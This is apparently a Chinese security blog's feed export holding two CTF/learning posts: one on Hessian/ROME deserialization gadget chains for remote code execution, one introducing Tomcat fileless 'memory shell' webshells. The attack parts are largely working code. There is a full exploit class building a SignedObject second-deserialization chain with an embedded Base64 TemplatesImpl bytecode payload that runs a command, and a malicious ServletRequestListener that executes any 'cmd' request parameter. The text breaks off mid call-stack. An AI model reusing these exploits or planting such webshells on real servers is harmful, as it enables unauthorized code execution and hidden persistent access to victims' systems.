Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.until.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Rome的rce过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>  _cachedTypeDeserializerMap.put(type, deserializer);<br>&#125;<br></code></pre></td></tr></table></figure><p>进入触发点，接着调用 EqualBean 的 hashcode 方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236540.png" alt="image-20230124203554850"></p><p>接着会触发 ToStringBean 的 toString 方法（这里就有很多其它延申了，比如可以接一个 CC5）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236941.png" alt="image-20230124203614807"></p><p>接着进入 JdbcRowSetImp 的 toString 方法，在其中会调用 JdbcRowSetImp 的 getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236500.png" alt="image-20230124203639615"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236710.png" alt="image-20230124203654578"></p><p>当调用到 getDatabaseMetaData 的时候，会进入 connect 方法，进而调用 lookup 触发 jndi 注入。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236799.png" alt="image-20230124203716717"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236183.png" alt="image-20230124203736906"></p><h2 id="不出网打法（ROME）"><a href="#不出网打法（ROME）" class="headerlink" title="不出网打法（ROME）"></a>不出网打法（ROME）</h2><p><code>hessian</code>反序列化依赖<code>rome</code>的不出网利用方式</p><h4 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h4><p>在<code>java.security.SignedObject</code>中有一个<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>    b.close();<br>    a.close();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>是一个原生反序列化，那么就可以利用这里实现二次反序列化从而实现RCE。</p></blockquote><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> sun.security.provider.DSAPrivateKey;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">romeExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;<br>        HashMap hashMapx=getObject();<br><br>        <span class="hljs-comment">//构造SignedObject对象</span><br>        SignedObject signedObject=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMapx, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DSAPrivateKey</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>(<span class="hljs-string">&quot;x&quot;</span>) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitVerify</span><span class="hljs-params">(PublicKey publicKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitSign</span><span class="hljs-params">(PrivateKey privateKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span> b)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] engineSign() <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">engineVerify</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] sigBytes)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineSetParameter</span><span class="hljs-params">(String param, Object value)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">engineGetParameter</span><span class="hljs-params">(String param)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br><br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj= EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(hashMap);<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Field field=obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-comment">//获取原生反序列化对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//构造TemplatesImpl对象</span><br>        <span class="hljs-type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] bytee= <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,bytee);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Code&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templates);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj=EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-keyword">return</span>  hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb内存马学习</title>
      <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWeb内存马"><a href="#JavaWeb内存马" class="headerlink" title="JavaWeb内存马"></a>JavaWeb内存马</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的<strong>动态注册</strong>。</p><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png" alt="image-20230131214733513"></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，能对Servlet中的各种资源进行访问、添加、删除等。其在Java中的具体实现是<code>javax.servlet.ServletContext</code>接口</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。</p><p>Tomcat这里使用了<code>门面模式</code>，对<code>ApplicationContext</code>类进行了封装，我们调用<code>getServletContext()</code>方法获得的其实是<code>ApplicationContextFacade</code>类(门面类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ApplicationContextFacade</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.context = context;<span class="hljs-comment">//context的传递</span><br> <br>        classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>        initClassCache();<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>ApplicationContextFacade</code>类方法中都会调用this.context相应的方法，因此最终调用的还是<code>ApplicationContext</code>类的方法。</p><blockquote><p>门面模式可以简单分为三个部分:子系统、门面(Facade)、客户端</p><p>客户端可以通过调用门面方法进而调用集成的子系统方法，以医院类比，客户端相当于病人，门面相当于接待员，而子系统是医院内部细化的各部门。</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p><p><code>ApplicationContext</code>中的许多方法实际上还是调用了<code>StandardContext</code>中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext context;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestCharacterEncoding</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">return</span> context.getRequestCharacterEncoding();<br>      &#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png" alt="image-20230131221926469"></p><blockquote><p>可以看出我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote><h2 id="0x01-Tomcat内存马"><a href="#0x01-Tomcat内存马" class="headerlink" title="0x01 Tomcat内存马"></a>0x01 Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>这依赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，为方便调试，先加入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意版本与本机tomcat匹配，tomcat10后把很多常用类的位置都改了</p></blockquote><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>目标就是在服务器中动态注册一个恶意的Listener。</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>用于监听<code>ServletRequest</code>对象，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法</p></blockquote><p>创建一个Servlet项目实现恶意Listener,目录配置⬇️</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png" alt="image-20230201014157169"></p><p>shell_Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问任意目录可以执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png" alt="image-20230201014602139"></p><blockquote><p>接下来只要将恶意Listener动态注册进服务器</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">requestInitialized:<span class="hljs-number">13</span>, shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span 